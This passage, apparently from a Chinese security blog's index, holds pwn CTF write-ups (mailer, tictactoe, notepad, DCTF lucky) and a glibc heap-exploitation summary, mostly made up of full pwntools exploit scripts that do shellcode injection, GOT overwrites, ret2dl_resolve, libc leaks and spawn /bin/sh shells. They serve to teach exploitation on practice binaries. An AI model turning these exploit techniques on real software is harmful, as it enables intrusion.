21)payload3 += "3333" 在这里膜下M4X大佬和D4rk3r大佬参考了他们的wirteupM4XD4rk3r]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆利用的一些总结]]></title>
    <url>%2F2018%2F09%2F30%2F2018-9-30-%E5%A0%86%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[最近闲来无事，就把学过的堆的利用总结一下。这里只是总结一下利用的思路，基础知识就不讲了，可能会贴上些glibc的源码。 一些学习网站CTF-WIKI入门网站 CTF-ALL-IN-ONE对堆的利用的原理讲的很清楚 Heap Exploitation国外作者写的，感觉还行 source code of malloc.c在线阅读glibc的源码，很方便 UAFUAF也就是use after free，这种情况的产生是因为free掉了chunk后没有将它的指针置为空。所以在被free掉后还可以被使用。 用处： 泄露信息，比如说泄露libc的地址 与fastbins attack结合，分配到包含想要控制的地址的chunk 进行unsortedbin attack，向一个地址内写入一个很大的值 unsafe unlinkunlink的目的：把一个双向链表中的空闲块拿出来，然后和目前物理相邻的 free chunk 进行合并。这实际上是对chunk的fd和bk指针的操作，fd_nextsize和bk_nextsize只有在chunk是large bins chunk时才会用到，而一般情况下很少用到。 unlink攻击的前提条件： 程序必须有个地方存储着malloc返回的chunk的地址，例如bss段中存放chunk地址的全局变量数组 unlink攻击的本质，是对fd和bk这两个指针的利用123456789101112131415FD = P-&gt;fd; BK = P-&gt;bk; FD-&gt;bk = BK; BK-&gt;fd = FD; 因为unlink会有一个check,检查chunk的fd和bk是否被恶意修改了，所以要绕过这一checkFD和BK只能修改成特定的值，假设ptr上存储着P的地址 (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))64位下FD = ptr - 0x18BK = ptr- 0x10unlink实际做了*(ptr - 0x18 + 0x18) = ptr - 0x10*(ptr - 0x10 - 0x10) = ptr - 0x18 #主要看这步等价于*ptr = ptr - 0x18 通过unlink攻击可以实现向任意地址写 PWN中的unlink 攻击主要分两种： 向前合并的unlink(这里的前是指高地址的chunk) 向后合并的unlink(这里的后是指低地址的chunk)这两者要构造的chunk有点不一样下面一律假设 free掉的chunk为P，存储着P地址的地址 为ptr 向后合并源码：123456if (!prev_inuse(p)) &#123; prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); &#125; 根据P的size字段的flag位，判断前一个chunk是否正在使用 如果前一个chunk是free状态，修改size大小 修改指向P的指针，改为指向前一个chunk 利用unlink将前一个chunk从bins链表中移除这里构造的话要在前一个chunk中伪造一个fake_chunk,fake_chunk的fd和bk指针要为特定值， 同时通过存在的漏洞控制当前chunk的prev_size字段和size字段，使其prev_size的大小的 fake_chunk的大小，size字段中的prev_inuse标志位为0构造的payload 123456789//假设 前一个chunk的大小为0xa0, P的大小为0x9064位的fake_chunk = p64(0) + p64(0x90) + p64(ptr - 0x18) + p64(ptr - 0x10) fake_chunk = fake_chunk.ljust(0x90,'a')32位的fake_chunk = p32(0) + p32(0x90) + p32(ptr- 0x10) + p32(ptr - 0x8)fake_chunk = fake_chunk.ljust(0x90,'a')同时要修改P的prev_size为 0x90，size字段为0x90最后free掉P就可以触发unlink了 2.向前合并源码： 1234567891011121314 if (nextchunk != av-&gt;top) &#123; /* get and clear inuse bit */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize);/*这里检查下下个chunk的flag标志位*/ /* consolidate forward */ if (!nextinuse) &#123; unlink(av, nextchunk, bck, fwd); size += nextsize; &#125;...#define inuse_bit_at_offset(p, s)\ (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE) 检查下下个chunk的prev_inuse标志位 如果prev_inuse为0，就进行unlink，将P从链表中取出 然后修改P的size字段这里利用要构造的chunk和向后合并不一样，它要能控制P的下下个chunk的size字段 上面的图是一个64位的简单的例子，chunk1已经设置好了fd和bk，此时只要free掉chunk0，就会检查是否可以向前合并，通过检查chunk0的下下个chunk的prev_inuse标志位，也就是chunk2的，这里chunk2的prev_ inuse已经被我设置为0了，这时就会进行向前合并，通过unlink宏将chunk1从链表中取出来。 大致的就是上面所说的，不过实际上会复杂很多。下面贴上unlink源码unlink源码：12345678910111213141516171819202122232425262728293031#define unlink(AV, P, BK, FD) &#123; if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) /*检查chunk的size字段*/ malloc_printerr ("corrupted size vs. prev_size"); FD = P-&gt;fd; BK = P-&gt;bk; if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))/*检查chunk的fd 和bk是否正确，这里也是unlink要绕过的地方*/ malloc_printerr ("corrupted double-linked list"); else &#123; FD-&gt;bk = BK; BK-&gt;fd = FD; if (!in_smallbin_range (chunksize_nomask (P)) &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) malloc_printerr ("corrupted double-linked list (not small)"); if (FD-&gt;fd_nextsize == NULL) &#123; if (P-&gt;fd_nextsize == P) FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; else &#123; FD-&gt;fd_nextsize = P-&gt;fd_nextsize; FD-&gt;bk_nextsize = P-&gt;bk_nextsize; P-&gt;fd_nextsize-&gt;bk_nextsize = FD; P-&gt;bk_nextsize-&gt;fd_nextsize = FD; &#125; &#125; else &#123; P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; &#125; &#125; &#125; &#125; top_chunktopchunk简单的玩法就是house_of_force，分配出包含想要控制的地址的chunk，一般来说用来修改got表的内容，或者是修改_malloc_hook或者free_hook的内容。还有一种玩法就是往特定的地址写入特定的值，这个和topchunk的分配机制有关。 详情参考我这篇博客 unsortedbin attackoffbyonehouse_of_orangehouse_of_roman留下些坑以后有时间慢慢填]]></content>
      <categories>
        <category>Heap_Exploitation</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>houseofxxx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mailer writeup]]></title>
    <url>%2F2018%2F09%2F24%2F2018-9-24-mailer-writeup%2F</url>
    <content type="text"><![CDATA[防护机制 1234567[*] &apos;/home/zs0zrc/pwn/Scoreboard/mailer/mailer&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 程序逻辑很简单，只有两个功能 write mail 和dump 1234567891011121314151617181920212223242526272829int service()&#123; unsigned int v0; // eax qmemcpy(&amp;helloworld, &amp;unk_8048AA0, 0x48u); root = &amp;helloworld; memcpy(&amp;helloworld + 72, "Hello, World", 0xCu); while ( 1 ) &#123; while ( 1 ) &#123; puts("0. Exit"); puts("1. Write mail"); puts("2. Dump mails"); printf("Action: "); v0 = readint(); if ( v0 != 1 ) break; write_mail(); &#125; if ( v0 &lt; 1 ) break; if ( v0 == 2 ) dump_mail(); else puts("Invalid choice"); &#125; return puts("Bye");&#125; 漏洞在于writemail函数中用了两个 gets来读取数据，而mail的大小size存储在chunk中，dump是根据chunk中存储的mail大小来输出的。所以可以修改mail的大小，从而泄露出堆的地址。同时也可以溢出修改topchunk的size字段，所以这个很明显是用house_of_force来做。因为没开NX，所以可以往堆里写shellcode，然后利用house_of_force修改puts_got为shellcode的地址来getshell 123456789101112131415161718char *write_mail()&#123; int size; // eax char *mail; // ST1C_4 char *result; // eax printf("Content Length: "); size = readint(); mail = new_mail(size); printf("Title: "); gets(mail + 4); printf("Content: "); gets(mail + 72); *mail = root; result = mail; root = mail; return result;&#125; 具体步骤： 1234new一个mail来存放shellcode，同时修改这个mail的size字段再new一个mail，修改top_chunk的size字段为0xffffffff利用dump函数泄露出heap地址利用house_of_force修改puts_got为shellcode地址 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./mailer') elf = ELF('./mailer') libc = elf.libcelse: host = 'hackme.inndy.tw' port = '7721' p = remote(host,port) elf = ELF('./mailer')context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def mail(size,title,content): ru('Action: ') sl('1') ru('Length: ') sl(str(size)) ru('Title: ') sl(title) ru('Content: ') sl(content) shellcode = asm(shellcraft.sh())target = 0x0804A030payload = 'a'*12+ p32(0xffffffff)mail(50,'a'*16*4 + p32(0x40),shellcode + '######')mail(10,'aaaa',payload)rc()sl('2')ru('######')leak_heap = u32(p.recv(12)[6:10])log.info(hex(leak_heap))shellcode_add = leak_heap + 72topchunk = leak_heap + 0xd0evil_size = target - topchunk - 0x14 - 72print evil_sizemail(evil_size,'aaaa','bbbb')mail(30,p32(shellcode_add)*2,'dddd')p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tictactoe2 writeup]]></title>
    <url>%2F2018%2F09%2F24%2F2018-9-24-tictactoe2-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： 123456[*] &apos;/home/zs0zrc/pwn/Scoreboard/tictactoe/tictactoe&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 这题文件和tictactoe1是一样的，只不过这个要求getshell，漏洞点也就是一个任意地址写，我对着分析了半天除了想到将n修改成0，使得可以进行9次任意地址写 ，就想不到什么了，看了大佬的writeup才发现是用 ret2_dl_runtime_resolve做的 12345678910111213for ( i = 0; i &lt;= 8 &amp;&amp; !sub_80487F6(); ++i ) &#123; if ( n == -1 ) &#123; sub_80489C0(); &#125; else &#123; sub_8048762(); sub_8048A4B(); &#125; n = -n; &#125; elf文件各个节的信息： 1234567891011121314151617181920212223242526LOAD:0804AF14 stru_804AF14 Elf32_Dyn &lt;1, &lt;1&gt;&gt; ; DATA XREF: LOAD:080480BC↑oLOAD:0804AF14 ; .got.plt:0804B000↓oLOAD:0804AF14 ; DT_NEEDED libc.so.6LOAD:0804AF1C Elf32_Dyn &lt;0Ch, &lt;8048498h&gt;&gt; ; DT_INITLOAD:0804AF24 Elf32_Dyn &lt;0Dh, &lt;8048DA4h&gt;&gt; ; DT_FINILOAD:0804AF2C Elf32_Dyn &lt;19h, &lt;804AF04h&gt;&gt; ; DT_INIT_ARRAYLOAD:0804AF34 Elf32_Dyn &lt;1Bh, &lt;8&gt;&gt; ; DT_INIT_ARRAYSZLOAD:0804AF3C Elf32_Dyn &lt;1Ah, &lt;804AF0Ch&gt;&gt; ; DT_FINI_ARRAYLOAD:0804AF44 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt; ; DT_FINI_ARRAYSZLOAD:0804AF4C Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASHLOAD:0804AF54 Elf32_Dyn &lt;5, &lt;80482F8h&gt;&gt; ; DT_STRTAB//要修改的地方LOAD:0804AF5C Elf32_Dyn &lt;6, &lt;80481D8h&gt;&gt; ; DT_SYMTABLOAD:0804AF64 Elf32_Dyn &lt;0Ah, &lt;0BCh&gt;&gt; ; DT_STRSZLOAD:0804AF6C Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt; ; DT_SYMENTLOAD:0804AF74 Elf32_Dyn &lt;15h, &lt;0&gt;&gt; ; DT_DEBUGLOAD:0804AF7C Elf32_Dyn &lt;3, &lt;804B000h&gt;&gt; ; DT_PLTGOTLOAD:0804AF84 Elf32_Dyn &lt;2, &lt;68h&gt;&gt; ; DT_PLTRELSZLOAD:0804AF8C Elf32_Dyn &lt;14h, &lt;11h&gt;&gt; ; DT_PLTRELLOAD:0804AF94 Elf32_Dyn &lt;17h, &lt;8048430h&gt;&gt; ; DT_JMPRELLOAD:0804AF9C Elf32_Dyn &lt;11h, &lt;8048418h&gt;&gt; ; DT_RELLOAD:0804AFA4 Elf32_Dyn &lt;12h, &lt;18h&gt;&gt; ; DT_RELSZLOAD:0804AFAC Elf32_Dyn &lt;13h, &lt;8&gt;&gt; ; DT_RELENTLOAD:0804AFB4 Elf32_Dyn &lt;6FFFFFFEh, &lt;80483D8h&gt;&gt; ; DT_VERNEEDLOAD:0804AFBC Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUMLOAD:0804AFC4 Elf32_Dyn &lt;6FFFFFF0h, &lt;80483B4h&gt;&gt; ; DT_VERSYMLOAD:0804AFCC Elf32_Dyn &lt;0&gt; ; DT_NULL 先简单回顾下_dl_fixup的流程 12345根据rel_offset 得到函数reloc结构体在JMPREL中的位置根据reloc结构体中的r_offset 得到函数在got表中的地址根据reloc结构体中的r_info&gt;&gt;8得到函数的sym结构体在symtab中的位置根据sym结构中的st.name 得到函数字符串在strtab表中的位置最后根据得到的函数名称解析函数地址，将函数地址写入got表 在这里因为有任意地址写漏洞，并且存储着DT_STRTAB等节地址的地方是可以写的 所以可以修改DT_STRTAB。因为程序最后会执行memset函数，所以选择修改DT_STRTAB，使得在memset在调用_dl_fixup函数时查找函数名字符串时获得的字符串是”system“，最终解析出system函数，并且向n写入’sh\x00’，那么最后执行memset时就会执行system(‘sh\x00’) 1memset(&amp;n, 0, 0x18u); memset函数的字符串在DT_STRTAB中的偏移为 68 system函数的字符串的地址 —&gt;[0x804900c] target = 0x8049fc8 将DT_STRTAB修改为 target= system_add - 68，这样的话当memset函数去DT_STRTAB中查找字符串时就会得到”system”字符串 12345678910111213for ( i = 0; i &lt;= 8 &amp;&amp; !sub_80487F6(); ++i ) &#123; if ( n == -1 ) &#123; sub_80489C0(); &#125; else &#123; sub_8048762(); sub_8048A4B(); &#125; n = -n; &#125; 不过这里还要注意的是往n写入sh字符串时，这里会每次都会取反，所以在 i 等于奇数的时候写入sh字符串，最后在内存中的就是输入的sh字符串了。 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#!/usr/bin/env pythonfrom pwn import *local = 1if local: p = process('./tictactoe') elf = ELF('./tictactoe') libc = elf.libcelse: host = 'hackme.inndy.tw' port = '7714' p = remote(host,port) elf = ELF('./tictactoe')context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def debug(addr,PIE=False): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print &#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr)))def change(addr,value): ru("flavor):") sl('9') sleep(0.1) sl(value) offset = addr - 0x804B056 ru('flavor): ') sl(str(offset))targe = 0x8049fc8addr_STRTAB = 0x0804AF58n = 0x0804B048bss = elf.bss()rc()sl('1')change(n,'\x99') #0change(n,'\x73') #1change(addr_STRTAB,'\xc8') #2change(n + 1,'\x68') #3change(addr_STRTAB + 1,'\x9f') #4change(n+2,'\x00') #5change(n+0x10,'\xff') #6change(bss+0x100,'\xff') #7change(bss+0x100,'\xff') #8rc()p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tictactoe1 writeup]]></title>
    <url>%2F2018%2F09%2F24%2F2018-9-24-tictactoe-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： 123456[*] &apos;/home/zs0zrc/pwn/Scoreboard/tictactoe/tictactoe&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 这个程序是模拟下三子棋的机器人，程序的漏洞在 12345678910111213141516171819202122unsigned int sub_8048A4B()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf("\nInput move (9 to change flavor): "); v1 = read_int();//没有对输入的数字进行检查 if ( v1 == 9 ) &#123; read(0, &amp;buf, 4u); byte_804B04C = buf; sub_8048A4B(); &#125; else &#123; *(v1 + 0x804B056) = byte_804B04C;//可以输入负数，造成任意地址写，但是只能修改三次 if ( sub_80486F0(v1) ) *(v1 + 0x804B04D) = -1; &#125; return __readgsdword(0x14u) ^ v3; 同时程序中有输出flag的代码 1234567891011121314151617else if ( v1 == -1 ) &#123; print_msg("You win. Inconceivable!"); fd = open("flag_simple", 0); v5 = read(fd, buf, 0x100u); if ( fd &lt;= 0 || v5 &lt;= 0 ) &#123; print_msg("Can not read flag! Pls contact admin"); &#125; else &#123; buf[v5] = 0; printf("Here is your flag: %s\n", buf); print_msg("You need a shell to get another flag"); &#125; exit(0); &#125; 所以只要修改got表中没有被调用过的函数，使其指向这段代码的地址就好了。这里之所以要修改没调用的是因为没调用的函数在其got表中存储的是plt表的地址，是指向程序代码段的，如果是调用过的函数，它got表中存储的是libc的地址。 这里选择修改puts_got –&gt;[0x0804B024] 计算偏移 offset = -50 exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env pythonfrom pwn import *local = 1if local: p = process('./tictactoe') elf = ELF('./tictactoe') libc = elf.libcelse: host = 'hackme.inndy.tw' port = '7714' p = remote(host,port) elf = ELF('./tictactoe')context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def debug(addr,PIE=False): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print &#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr)))#target = elf.symbols['puts']#target = 0x0804B024vuln = 0x804B04Doffest = -50#gdb.attach(p,'b *0x08048A9E')ru("Play (1)st or (2)nd? ")sl('1')ru("flavor):")sl('9')sl(chr(0x46))ru(" flavor):")sl('-50')ru(" flavor):")sl('9')sl(chr(0x8c))ru(" flavor):")sl('-49')sl('1')p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DCTF Quals 2018 pwn题简单复现]]></title>
    <url>%2F2018%2F09%2F24%2F2018-9-24-DefCamp-CTF-pwn%E9%A2%98%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[这个比赛我就做出了第一道pwn….C++逆向真的是看到脑壳疼，还有一个pwn题用到了CVE-2018-11235 ….真的是打扰了 lucky 这道题是猜随机数，只是这题目是用C++写的，逆向看的有点难受 因为随机数的seed在栈上，加上它在输入name时，用了strcpy函数，没有限制输入的长度，所以可以覆盖seed的值为0x61616161。加上它在输入名字后又srand了一次，所以seed就被我们控制了，产生的随机数也就是确定的。 ida反编译看到的代码是长这样的 生成随机数的源码 123456789#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main()&#123; srand(0x61616161); for(int i=0;i&lt;100;i++)&#123; printf("%d\n",rand()); &#125; return 0;&#125; exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./lucky') elf = ELF('./lucky') libc = elf.libcelse: host = '167.99.143.206' port = '65031' p = remote(host,port) elf = ELF('./lucky')context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def debug(addr,PIE=False): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print &#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr)))fp = open('random.txt')l = []for i in fp: l.append(i) rc()sl('a'*0x2c4)for i in range(100): rc() sd(l[i])rc()print rc()#DCTF&#123;8adadb46b599a58344559e009bc167da7f0e65e64167c27d3192e8b6df073eaa&#125;p.interactive() more lucky 这题比赛时没做出来，它也是和随机数有关的，但是它没有lucky的漏洞，不能覆盖栈上的seed。 先简单分析下文件,ida反编译出来的代码长这样 拖进编辑器里修改成能看版： 1234567891011121314151617181920212223242526272829303132333435__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; times = time(0LL); srand(times / 10); cout&lt;&lt;"Hello, there!"&lt;&lt;endl； cout&lt;&lt;"What is your name?"&lt;&lt;endl; cin.getline(&amp;name); sub_2033(&amp;v28, times / 10000, times / 10000, times, v6, v7); serv_time = v28; cout&lt;&lt;"I am glad to know you, "&lt;&lt;name&lt;&lt;"!"&lt;&lt;endl; cout&lt;&lt;"Server time: "&lt;&lt;serv_time&lt;&lt;endl; cout&lt;&lt;"If you guess the next 100 random numbers I shall give you the flag!"&lt;&lt;endl; for ( i = 0; i &lt;= 99; ++i ) &#123; v30 = rand(); cout&lt;&lt;"What number am I thinking of? ["&lt;&lt;i&lt;&lt;"/100]"&lt;&lt;endl; cin&gt;&gt;buf; v29 = sub_1FE9(&amp;buf, 0LL, 10LL); if ( v29 != v30 ) &#123; cout&lt;&lt;"Wow that is wrong!"&lt;&lt;endl; return -1 &#125; cout&lt;&lt;"Wow that is corect!"&lt;&lt;endl; &#125; ifs = ifstream("./flag2"); if ( is_open(ifs) ) &#123; ifs.getline(flag); cout &lt;&lt; flag &lt;&lt; endl; ifs.close(); &#125; return 0;&#125; 这题和lucky的不同在于它使用的srand(time/10)来做随机数的种子，并且它将 time/10000打印出来了。 程序先根据time(0)生成服务器时间，然后srand(times/10)来设置seed的值。用户输入name后，将times/10000打印出来。而且它没有再次srand(),所以需要找到seed的值。这里它使用srand(times/10)来初始化seed值，并且只有最后三位是未知的。因为time(0)返回以秒为单位的时间，它用times/10来做srand()的参数，最后三位数每隔十秒增加一次，这使得它很容易受到暴力攻击。 根据大佬的writeup，暴力猜它服务器的时间，猜对的可能性为1/1000，所以写脚本暴力跑 生成随机数的c代码： 1234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; int main(int argc, char **argv) &#123; int seed = atoi(argv[1]); srand(seed); for (int i = 0; i &lt; 100; i++) &#123; printf("%d\n", rand()); &#125; return 0;&#125; exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/env pythonfrom pwn import *import subprocesslocal = 1if local: p = process('./lucky2') elf = ELF('./lucky2') libc = elf.libcelse: host = '167.99.143.206' port = '65032' p = remote(host,port) elf = ELF('./lucky2') context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)times = 153778000for i in range(1000): times += 1 print"times--&gt;[&#123;&#125;]".format(times) p = remote("167.99.143.206", 65032) rc() sl('aaaa') number = subprocess.check_output(["./rand1", str(times)]).split('\n') try: for i in range(100): ru("100]") sl(number[i]) p.interactive() #DCTF&#123;2e7aaa899a8b212ea6ebda3112d24559f2d2c540a9a29b1b47477ae8e5f20ace&#125; except EOFError: pass Online linter 这就是那道用到了CVE的题目，orz , drl。以后再研究吧 贴下大佬writeup的地址 writeup]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[notepad writeup]]></title>
    <url>%2F2018%2F09%2F23%2F2018-9-22-notepad-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： 123456[*] &apos;/home/zs0zrc/pwn/Scoreboard/notepad/notepad&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 这题的漏洞主要在于 notepad_open函数中的menu函数，它对输入的上界进行了检查，但是没对下界进行检查，导致可以输入比 ‘a’小的字符,加上它根据menu的返回值来确定调用函数的位置的，所以可以提前在堆上布置好函数指针，通过输入notepad_open函数，输入特定的字符，来调用布置在堆上的函数指针 12345678910111213141516171819202122int __cdecl menu(int a1)&#123; int result; // eax int i; // [esp+8h] [ebp-10h] int v3; // [esp+Ch] [ebp-Ch] for ( i = 0; *(4 * i + a1); ++i ) printf("%c&gt; %s\n", i + 'a', *(4 * i + a1)); printf("::&gt; "); v3 = getchar() - 'a'; freeline(); if ( v3 &lt; i ) // vuln result = v3 + 1; else result = 0; return result;&#125;//调用函数的代码 v0 = menu(&amp;v4);(*(&amp;v3-&gt;show + v0 - 1))(v3);//这里v0是menu返回的数字//它根据 note的show指针的地址 + v0 -1来确定函数的地址 note的结构： 123456struct note&#123; notepad_show *notepad_show; notepad_destroy *notepad_destroy; int flags; int n;&#125; 具体的思路： 先分配三个small bins大小的chunk，在第一个chunk中布置好 free_plt的地址，然后用notepad_open函数的漏洞，调用free_plt，将chunk2 free掉。这时只要delete掉chunk1，chunk1和chunk2就会进行unlink合并，将这个合并后的chunk申请回来，就可以对chunk2造成overlap，就可以控制chunk2的函数指针。利用printf函数泄露出libc的地址，最后再构成system(‘/bin/sh\x00’) 函数来getshell 先create三个0x60大小的chunk 123new(0x60,'aaaaa' + '\n')#chunk1new(0x60,'aaaaa' + '\n')#chunk2new(0x60,'aaaaa' + '\n')#chunk3 在chunk1中布置好free函数指针，调用notepad_open 使得chunk2被free掉 123payload = 'a'*0x5c + p32(elf.symbols['free'])open_y(0,payload+'\n')open_y(1,'aaaa\n','^')# '^' mean ord('a') - 3 delete掉chunk1，使chunk1和chunk2合并，再从堆中申请到合并后的chunk,布置好printf函数指针，泄露出libc地址 123456789delete(0)payload1 = 'a' * 0x5c + p32(elf.symbols['printf']) + 'aaaa'payload1 += 'a'*4 + '%1000$p\x00' + '\n'new(0xe0 - 16,payload1)open_n(1,'^')leak = int(p.recv(10),16)libc_base = leak - libc.symbols['_IO_2_1_stdin_']libc.address = libc_basesystem = libc.symbols['system'] delete 掉chunk1，布置好system函数，调用system函数 123456delete(0)payload2 = 'a'*0x5c + p32(system) + 'aaaa'payload2 += 'aaaa' + '/bin/sh\x00' + '\n'new(0xe0 - 16,payload2)open_n(1,'^')p.interactive() exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./notepad') elf = ELF('./notepad') libc = elf.libcelse: host = 'hackme.inndy.tw' port = '7713' p = remote(host,port) elf = ELF('./notepad') libc = ELF('./libc-2.23.so.i386')context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def debug(addr,PIE=False): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr)))def new(size,content): ru("::&gt; ") sl('a') ru("size &gt; ") sl(str(size)) ru("data &gt; ") sd(content)def open_y(idx,content,flags = 'a'): ru("::&gt; ") sl('b') ru("id &gt; ") sl(str(idx)) ru("edit (Y/n)") sl("y") ru("content &gt; ") sd(content) rc() sl(flags)def open_n(idx,flags = 'a'): ru("::&gt; ") sl('b') ru("id &gt; ") sl(str(idx)) rc() sl("n") rc() sl(flags)def delete(idx): ru("::&gt; ") sl('c') rc() sl(str(idx))def setread(idx): ru("::&gt; ") sl('d') rc() sl(str(idx))def keepsec(idx): ru("::&gt; ") sl('e') rc() sl(str(idx))rc()sl('c')#gdb.attach(p,'b *0x08048CCD')new(0x60,'aaaaa' + '\n')#chunk1new(0x60,'aaaaa' + '\n')#chunk2new(0x60,'aaaaa' + '\n')#chunk3payload = 'a'*0x5c + p32(elf.symbols['free'])open_y(0,payload+'\n')open_y(1,'aaaa\n','^')delete(0)payload1 = 'a' * 0x5c + p32(elf.symbols['printf']) + 'aaaa'payload1 += 'a'*4 + '%1000$p\x00' + '\n'new(0xe0 - 16,payload1)open_n(1,'^')leak = int(p.recv(10),16)libc_base = leak - libc.symbols['_IO_2_1_stdin_']libc.address = libc_basesystem = libc.symbols['system']delete(0)payload2 = 'a'*0x5c + p32(system) + 'aaaa'payload2 += 'aaaa' + '/bin/sh\x00' + '\n'new(0xe0 - 16,payload2)open_n(1,'^')p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[onepunch writeup]]></title>
    <url>%2F2018%2F09%2F22%2F2018-9-22-onepunch-writeup%2F</url>
